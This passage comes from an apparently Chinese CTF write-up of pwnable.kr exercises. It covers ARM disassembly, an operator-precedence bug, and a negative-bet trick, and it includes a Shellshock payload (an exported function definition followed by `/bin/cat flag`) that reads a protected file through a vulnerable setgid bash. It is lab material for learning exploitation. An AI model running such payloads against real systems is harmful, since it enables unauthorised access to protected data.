</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>((</span><span class=nf>key1</span><span class=p>()</span><span class=o>+</span><span class=nf>key2</span><span class=p>()</span><span class=o>+</span><span class=nf>key3</span><span class=p>())</span> <span class=o>==</span> <span class=n>key</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Congratz!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>r</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>write</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;I have strong leg :P</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>同时，本题也给出了对应的 gdb 反汇编结果，显然是 arm 汇编指令。<a href=https://azeria-labs.com/writing-arm-assembly-part-1/>参考</a></p><p>arm 架构下：</p><ul><li>采用 RISC 指令集</li><li>pc 指向当前执行指令地址 + 8 处</li><li>r0 保存返回值</li><li>r11 对应 ebp，r13 对应 esp</li><li>r15 即 pc，存储当前指令 + 8（thumb 模式下 + 4）的位置（即后两条指令）</li><li>arm 模式下指令长度 4 字节，thumb 模式下 2 字节</li><li>bx：带状态切换的跳转</li></ul><p>知道了这些后，逐函数查看，先是 key1：</p><pre tabindex=0><code>(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0
   0x00008cdc &lt;+8&gt;:    mov    r3, pc
   0x00008ce0 &lt;+12&gt;:    mov    r0, r3
   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0
   0x00008ce8 &lt;+20&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008cec &lt;+24&gt;:    bx    lr
End of assembler dump.
</code></pre><p>前两句和后三句是 arm 的函数入栈出栈返回操作，中间给 r3 赋值 <code>0x00008ce4</code> 并返回。</p><p>key2：</p><pre tabindex=0><code>(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0
   0x00008cf8 &lt;+8&gt;:    push    {r6}        ; (str r6, [sp, #-4]!)
   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1
   0x00008d00 &lt;+16&gt;:    bx    r6
   0x00008d04 &lt;+20&gt;:    mov    r3, pc
   0x00008d06 &lt;+22&gt;:    adds    r3, #4
   0x00008d08 &lt;+24&gt;:    push    {r3}
   0x00008d0a &lt;+26&gt;:    pop    {pc}
   0x00008d0c &lt;+28&gt;:    pop    {r6}        ; (ldr r6, [sp], #4)
   0x00008d10 &lt;+32&gt;:    mov    r0, r3
   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0
   0x00008d18 &lt;+40&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008d1c &lt;+44&gt;:    bx    lr
End of assembler dump.
</code></pre><p>第三行保存 r6，第四行 r6 变成 <code>0x00008d05</code>，第五行进行带状态切换的跳转，由于 r6 最低位为 1，切换为 thumb 模式并跳转到 <code>0x00008d04</code>，也就是第六行。</p><p>第六行，由于处于 thumb 模式，pc 指向当前指令 + 4 的位置，r3 变成 <code>0x00008d08</code>。第七行 r3+4 变成 <code>0x0008d0c</code>，这就是最终的返回值。</p><p>key3：</p><pre tabindex=0><code>(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0
   0x00008d28 &lt;+8&gt;:    mov    r3, lr
   0x00008d2c &lt;+12&gt;:    mov    r0, r3
   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0
   0x00008d34 &lt;+20&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008d38 &lt;+24&gt;:    bx    lr
End of assembler dump.
(gdb)
</code></pre><p>这里将 lr 赋值给 r3，然后 r3 作为返回值。而 lr 相当于 <code>return address</code>，需要我们回到 main 里去看相关调用：</p><pre tabindex=0><code>...
   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;
   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;
   0x00008d6c &lt;+48&gt;:    mov    r4, r0
   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;
   0x00008d74 &lt;+56&gt;:    mov    r3, r0
   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3
   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;
   0x00008d80 &lt;+68&gt;:    mov    r3, r0
   0x00008d84 &lt;+72&gt;:    add    r2, r4, r3
...
</code></pre><p>可以看到这里进行了 <code>bl 0x8d20</code> 来调用 <code>key3</code> 函数，指令位于 <code>0x00008d7c</code>，那么此时返回地址应该是它的下一条指令所在地址，也就是 <code>0x00008d80</code>。</p><p>至此我们已经拿到了 3 个 key，相加得到 <code>108400</code>，输入即可。</p><p>精简指令集的确精简。</p><h2 id=mistake class="relative group">mistake <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#mistake aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PW_LEN 10
</span></span></span><span class=line><span class=cl><span class=cp>#define XORKEY 1
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xor</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>XORKEY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>=</span><span class=nf>open</span><span class=p>(</span><span class=s>&#34;/home/mistake/password&#34;</span><span class=p>,</span><span class=n>O_RDONLY</span><span class=p>,</span><span class=mo>0400</span><span class=p>)</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;can&#39;t open password %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;do not bruteforce...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>sleep</span><span class=p>(</span><span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>%</span><span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>len</span><span class=o>=</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=n>pw_buf</span><span class=p>,</span><span class=n>PW_LEN</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;read error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf2</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;input password :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%10s&#34;</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// xor your input
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>xor</span><span class=p>(</span><span class=n>pw_buf2</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>pw_buf</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>,</span> <span class=n>PW_LEN</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Password OK</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Wrong Password</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>注意到 <code>XORKEY</code> 为 1，也就是说 <code>xor</code> 函数只是把字符串的每个字符最低位翻转了一下。此外我们还知道输入的密码和文件中密码都是 10 字节，但我们读取不了后者。</p><p>回到题目提示，说和运算符优先级有关，回代码里看看也只有 <code>fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0</code> 可能出问题了，这里会先进行小于号比较，再将结果，一个布尔值，赋值给 <code>fd</code>。如果文件正常打开，那么 <code>fd</code> 应该为 <code>false</code> 也就是 <code>0</code>，这就是标准输入流的 fd，换句话说这个 pw_buf 的内容也是我们可以控制的。</p><p>之后就容易了，标准输入里输入十个 <code>b</code>，然后提示 <code>input password:</code> 时输入十个 <code>c</code> 使得异或结果正确即可。</p><h2 id=shellshock class="relative group">shellshock <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#shellshock aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nf>setresuid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=nf>setresgid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/home/shellshock/bash -c&#39;echo shock_me&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>我们需要结合 <code>ls -al</code> 的结果来分析代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>drwxr-x---   <span class=m>5</span> root shellshock       <span class=m>4096</span> Oct <span class=m>23</span>  <span class=m>2016</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>114</span> root root             <span class=m>4096</span> May <span class=m>19</span> 15:59 ..
</span></span><span class=line><span class=cl>-r-xr-xr-x   <span class=m>1</span> root shellshock     <span class=m>959120</span> Oct <span class=m>12</span>  <span class=m>2014</span> bash
</span></span><span class=line><span class=cl>d---------   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>12</span>  <span class=m>2014</span> .bash_history
</span></span><span class=line><span class=cl>-r--r-----   <span class=m>1</span> root shellshock_pwn     <span class=m>47</span> Oct <span class=m>12</span>  <span class=m>2014</span> flag
</span></span><span class=line><span class=cl>dr-xr-xr-x   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>12</span>  <span class=m>2014</span> .irssi
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>23</span>  <span class=m>2016</span> .pwntools-cache
</span></span><span class=line><span class=cl>-r-xr-sr-x   <span class=m>1</span> root shellshock_pwn   <span class=m>8547</span> Oct <span class=m>12</span>  <span class=m>2014</span> shellshock
</span></span><span class=line><span class=cl>-r--r--r--   <span class=m>1</span> root root              <span class=m>188</span> Oct <span class=m>12</span>  <span class=m>2014</span> shellshock.c
</span></span></code></pre></div><p>可以看到我们对 <code>flag</code> 文件没有任何权限，但是 <code>shellshock_pwn</code> 组的用户可以读 <code>flag</code>。回到代码中，将 <code>uid</code> 和 <code>gid</code> 设成 <code>egid</code> 后，程序已经拥有了 <code>shellshock_pwn</code> 组的权限，可以读到 <code>flag</code> 了，只是并没有读 <code>flag</code> 的代码。</p><p>联系题目提示，我们可以利用 bash 的 <a href=https://www.freebuf.com/news/48331.html>ShellShock 漏洞</a>，具体原理可以参考链接中的文章。输入 payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>export</span> <span class=nv>foo</span><span class=o>=</span><span class=s1>&#39;() {:;}; /bin/cat flag&#39;</span>
</span></span><span class=line><span class=cl>$ ./shellshock
</span></span></code></pre></div><h2 id=coin1 class="relative group">coin1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#coin1 aria-label=锚点>#</a></span></h2><p>找假币问题，在 N 个硬币中最多花 C 次来找到唯一的一个较轻的假币，需要在 30 秒内完成 100 次游戏。最经典的解法就是二分，每次称一半，如果重量不是 10 的倍数则其中必定有假币，否则假币在另一半中，这样最多需要 <code>log(2, n)</code> 次就能找出假币。需要注意的是，由于网络延迟的关系，最好是在 pwnable.kr 的机器上运行脚本。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>9007</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>N</span> <span class=o>=</span> <span class=n>ret</span><span class=p>[</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;N=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span><span class=p>:</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span> <span class=o>=</span> <span class=n>ret</span><span class=p>[</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;C=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span><span class=p>:</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>low</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>high</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>C</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>cnt</span> <span class=o>=</span> <span class=p>(</span><span class=n>high</span><span class=o>-</span><span class=n>low</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=n>low</span> <span class=o>+</span> <span class=n>cnt</span>
</span></span><span class=line><span class=cl>        <span class=n>query</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>mid</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>query</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>low</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>high</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>low</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=blackjack class="relative group">blackjack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#blackjack aria-label=锚点>#</a></span></h2><p>这题要求玩 21 点玩到拥有 <code>$1,000,000</code>，显然不能通过常规方法达成。我们查看题目给的源码，发现下注时使用的变量 <code>bet</code> 是一个 <code>int</code> 类型的数。</p><p>随后，<code>betting</code> 函数是这样的：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>betting</span><span class=p>()</span> <span class=c1>//Asks user amount to bet
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>Enter Bet: $&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bet</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=k>if</span> <span class=p>(</span><span class=n>bet</span><span class=o>&gt;</span> <span class=n>cash</span><span class=p>)</span> <span class=c1>//If player tries to bet more money than player has
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>You cannot bet more money than you have.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Enter Bet:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bet</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=k>else</span> <span class=k>return</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// End Function
</span></span></span></code></pre></div><p>这里程序检查了下的注是否大于拥有的现金数，但并没有检查是否为负数。而当我们输掉一盘后：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>player_total</span><span class=o>&lt;</span><span class=n>dealer_total</span><span class=p>)</span> <span class=c1>//If player&#39;s total is less than dealer&#39;s total, loss
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Dealer Has the Better Hand. You Lose.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>loss</span> <span class=o>=</span> <span class=n>loss</span><span class=o>+</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>cash</span> <span class=o>=</span> <span class=n>cash</span> <span class=o>-</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>You have %d Wins and %d Losses. Awesome!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>won</span><span class=p>,</span> <span class=n>loss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>dealer_total</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nf>askover</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>可以看到这里有一个 <code>cash = cash - bet</code> 的语句，当我们输入的 <code>bet</code> 是负数时，我们就可以让钱不减反增。也就是说，我们只需要下注 <code>-1000000</code>，然后故意输掉即可。</p><h2 id=lotto class="relative group">lotto <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#lotto aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>submit</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>play</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Submit your 6 lotto bytes :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>submit</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Lotto Start!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>//sleep(1);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// generate lotto numbers
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>==-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;error. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
